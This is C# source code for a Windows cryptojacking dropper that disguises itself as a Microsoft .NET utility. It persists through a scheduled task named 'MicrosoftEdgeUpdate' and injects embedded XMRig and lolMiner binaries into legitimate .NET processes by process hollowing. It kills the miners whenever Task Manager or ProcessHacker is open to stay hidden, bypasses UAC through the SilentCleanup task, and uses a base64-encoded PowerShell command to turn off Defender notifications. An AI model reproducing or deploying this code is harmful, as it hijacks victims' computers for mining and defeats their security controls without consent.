using Microsoft.Win32;
using Miner;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using VolVeR.Properties;
using VolVeRFMI;
using VolVeR;


    [assembly: AssemblyTitle("Installation Utility")]
    [assembly: AssemblyDescription("Microsoft .NET Services Installation Utility")]
    [assembly: AssemblyCompany("Microsoft® .NET Framework")]
    [assembly: AssemblyProduct("Microsoft Corporation")]
    [assembly: AssemblyCopyright("© Microsoft Corporation.  All rights reserved.")]
    [assembly: AssemblyTrademark("")]



namespace VolVeR
{
    class Program
    {
        public static void Main()
        {
            try
            {
                new Installer().Run();
            }
            catch (Exception)
            {
            }




            if (!MutexControl.CreateMutex())
                Environment.Exit(0);

            try
            {
                var startInfo = new ProcessStartInfo
                {
                    FileName = "schtasks.exe",
                    CreateNoWindow = false,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = @"/create /sc MINUTE /mo 3 /tn ""MicrosoftEdgeUpdate"" /tr """ + config.folder + "\\" + config.FileName + @""" /f"
                };
                Process.Start(startInfo);
            }
            catch { }

            int num = 0;
            try
            {
                num = RAM.GetVRAM();
            }
            catch (Exception ex)
            {
            }



            byte[] xmr =  Properties.Resources.xmrig;
            byte[] lolMiner =  Properties.Resources.lolMiner;


            string args1 = "--algo rx/0 --donate-level 0   --max-cpu-usage " + config.moneroUsage + " -o" + config.moneroPool + " -u " + config.moneroWallet;
            string args2 = "--log off --nocolor --algo ETCHASH --pool " + config.etcPool + " --user " + config.etcWallet + "." + config.etcWorker;
            string args3 = "--log off --nocolor --algo ETHASH --pool " + config.ethPool + " --user " + config.ethWallet + "." + config.ethWorker;
            string withoutExtension1 = Path.GetFileNameWithoutExtension("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe");
            string withoutExtension2 = Path.GetFileNameWithoutExtension("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe");

            List<string> stringList = new List<string>();
            stringList.Add("mmc");
            stringList.Add("ProcessHacker");
            stringList.Add("Taskmgr");
            stringList.Add("Диспетчер задач");

            try
            {

                foreach (string processName in stringList)
                {
                    for (Process[] processesByName = Process.GetProcessesByName(processName); processesByName.Length != 0; processesByName = Process.GetProcessesByName(processName))
                    {
                        foreach (Process process in Process.GetProcessesByName(withoutExtension1, withoutExtension2))
                        {
                            try
                            {
                                process.Kill();
                            }
                            catch
                            {
                            }
                        }

                    }
                }

            }

            catch { }


            try
            {
                if (Process.GetProcessesByName(withoutExtension1).Length == 0)
                    Program.PE.Run(xmr, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe", args1);


            }

            catch { }

            if (num > 4068)
            {
                try
                {
                    if (Process.GetProcessesByName(withoutExtension2).Length == 0)
                        Program.PE.Run(lolMiner, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe", args2);

                }
                catch { }
            }

            else if (num > 6068)
            {
                try
                {

                    if (Process.GetProcessesByName(withoutExtension2).Length == 0)
                        Program.PE.Run(lolMiner, "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\vbc.exe", args3);

                }

                catch { }
            }

            if (config.bypassUAC == "true")
            {
                try
                {
                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        Program.UAC();
                        Environment.Exit(0);
                    }
                }
                catch (Exception ex)
                {
                }

            }

            if (config.disableDefenderNotifications == "true")
            {
                try
                {
                    Program.DisableNotify();
                }
                catch (Exception ex)
                {
                }
            }


        }
        public class AlwaysNotify
        {
            public AlwaysNotify()
            {
                RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                string str1 = registryKey.GetValue(Encoding.Default.GetString(Convert.FromBase64String("Q29uc2VudFByb21wdEJlaGF2aW9yQWRtaW4="))).ToString();
                string str2 = registryKey.GetValue(Encoding.Default.GetString(Convert.FromBase64String("UHJvbXB0T25TZWN1cmVEZXNrdG9w"))).ToString();
                registryKey.Close();
                if (!(str1 == "2" & str2 == "1"))
                    return;
                Environment.Exit(1);
            }
        }


        public static void DisableNotify()
        {
            Process Disable = Process.Start(new ProcessStartInfo()
            {
                FileName = "powershell",
                Arguments = Encoding.Default.GetString(Convert.FromBase64String("U2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcXFNPRlRXQVJFXFxNaWNyb3NvZnRcXFdpbmRvd3MgRGVmZW5kZXIgU2VjdXJpdHkgQ2VudGVyXFxOb3RpZmljYXRpb25zJyAtTmFtZSBEaXNhYmxlTm90aWZpY2F0aW9ucyAtVmFsdWUgMQ==")),
                UseShellExecute = false,
                RedirectStandardOutput = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
        }

        public static void UAC()
        {
            string str = Assembly.GetExecutingAssembly().Location + " && REM";
            Program.AlwaysNotify alwaysNotify = new Program.AlwaysNotify();
            if (!str.Contains("REM"))
                Environment.Exit(1);
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Environment", true);
            registryKey.SetValue("windir", (object)str);
            new Process()
            {
                StartInfo = {
          WindowStyle = ProcessWindowStyle.Hidden,
          FileName = "C:\\windows\\system32\\schtasks.exe",
          Arguments = "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"
        }
            }.Start();
            Thread.Sleep(2000);
            registryKey.DeleteValue("windir");
        }

        public static class MutexControl
        {

            public static Mutex currentApp;

            public static bool CreateMutex()
            {
                bool createdNew;
                currentApp = new Mutex(false, config.mutex, out createdNew);
                return createdNew;
            }
        }




        public static class PE
        {
            [DllImport("kernel32.dll")]
            private static extern unsafe bool CreateProcess(
              string lpApplicationName,
              string lpCommandLine,
              IntPtr lpProcessAttributes,
              IntPtr lpThreadAttributes,
              bool bInheritHandles,
              uint dwCreationFlags,
              IntPtr lpEnvironment,
              string lpCurrentDirectory,
              Program.PE.StartupInfo* lpStartupInfo,
              byte[] lpProcessInfo);

            [DllImport("kernel32.dll")]
            private static extern long VirtualAllocEx(
              long hProcess,
              long lpAddress,
              long dwSize,
              uint flAllocationType,
              uint flProtect);

            [DllImport("kernel32.dll")]
            private static extern long WriteProcessMemory(
              long hProcess,
              long lpBaseAddress,
              byte[] lpBuffer,
              int nSize,
              long written);

            [DllImport("ntdll.dll")]
            private static extern uint ZwUnmapViewOfSection(long ProcessHandle, long BaseAddress);

            [DllImport("kernel32.dll")]
            private static extern bool SetThreadContext(long hThread, IntPtr lpContext);

            [DllImport("kernel32.dll")]
            private static extern bool GetThreadContext(long hThread, IntPtr lpContext);

            [DllImport("kernel32.dll")]
            private static extern uint ResumeThread(long hThread);


            [DllImport("kernel32.dll")]
            private static extern bool CloseHandle(long handle);

            public static unsafe void Run(byte[] payloadBuffer, string host, string args)
            {
                int num1 = Marshal.ReadInt32((object)payloadBuffer, 60);
                int num2 = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 56);
                int nSize = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 60);
                int num3 = Marshal.ReadInt32((object)payloadBuffer, num1 + 24 + 16);
                short num4 = Marshal.ReadInt16((object)payloadBuffer, num1 + 4 + 2);
                short num5 = Marshal.ReadInt16((object)payloadBuffer, num1 + 4 + 16);
                long num6 = Marshal.ReadInt64((object)payloadBuffer, num1 + 24 + 24);
                Program.PE.StartupInfo startupInfo = new Program.PE.StartupInfo();
                startupInfo.cb = (uint)Marshal.SizeOf<Program.PE.StartupInfo>(startupInfo);
                startupInfo.wShowWindow = (ushort)0;
                startupInfo.dwFlags = 1U;
                byte[] lpProcessInfo = new byte[24];
                IntPtr num7 = Marshal.AllocHGlobal(1232 / 16);
                string lpCommandLine = host;
                if (!string.IsNullOrEmpty(args))
                    lpCommandLine = lpCommandLine + " " + args;
                string currentDirectory = Directory.GetCurrentDirectory();
                Marshal.WriteInt32(num7, 48, 1048603);
                Program.PE.CreateProcess((string)null, lpCommandLine, IntPtr.Zero, IntPtr.Zero, true, 4U, IntPtr.Zero, currentDirectory, &startupInfo, lpProcessInfo);
                long num8 = Marshal.ReadInt64((object)lpProcessInfo, 0);
                long num9 = Marshal.ReadInt64((object)lpProcessInfo, 8);
                int num10 = (int)Program.PE.ZwUnmapViewOfSection(num8, num6);
                Program.PE.VirtualAllocEx(num8, num6, (long)num2, 12288U, 64U);
                Program.PE.WriteProcessMemory(num8, num6, payloadBuffer, nSize, 0L);
                for (short index = 0; (int)index < (int)num4; ++index)
                {
                    byte[] numArray = new byte[40];
                    Buffer.BlockCopy((Array)payloadBuffer, num1 + (24 + (int)num5) + 40 * (int)index, (Array)numArray, 0, 40);
                    int num11 = Marshal.ReadInt32((object)numArray, 12);
                    int length = Marshal.ReadInt32((object)numArray, 16);
                    int srcOffset = Marshal.ReadInt32((object)numArray, 20);
                    byte[] lpBuffer = new byte[length];
                    Buffer.BlockCopy((Array)payloadBuffer, srcOffset, (Array)lpBuffer, 0, lpBuffer.Length);
                    Program.PE.WriteProcessMemory(num8, num6 + (long)num11, lpBuffer, lpBuffer.Length, 0L);
                }
                Program.PE.GetThreadContext(num9, num7);
                byte[] bytes = BitConverter.GetBytes(num6);
                long num12 = Marshal.ReadInt64(num7, 136);
                Program.PE.WriteProcessMemory(num8, num12 + 16L, bytes, 8, 0L);
                Marshal.WriteInt64(num7, 128, num6 + (long)num3);
                Program.PE.SetThreadContext(num9, num7);
                int num13 = (int)Program.PE.ResumeThread(num9);
                Marshal.FreeHGlobal(num7);
                Program.PE.CloseHandle(num8);
                Program.PE.CloseHandle(num9);
            }

            private static IntPtr Align(IntPtr source, int alignment)
            {
                long num = source.ToInt64() + (long)(alignment - 1);
                return new IntPtr((long)alignment * (num / (long)alignment));
            }



            [StructLayout(LayoutKind.Explicit, Size = 104)]
            public struct StartupInfo
            {
                [FieldOffset(0)]
                public uint cb;
                [FieldOffset(60)]
                public uint dwFlags;
                [FieldOffset(64)]
                public ushort wShowWindow;
            }
        }



    }
}
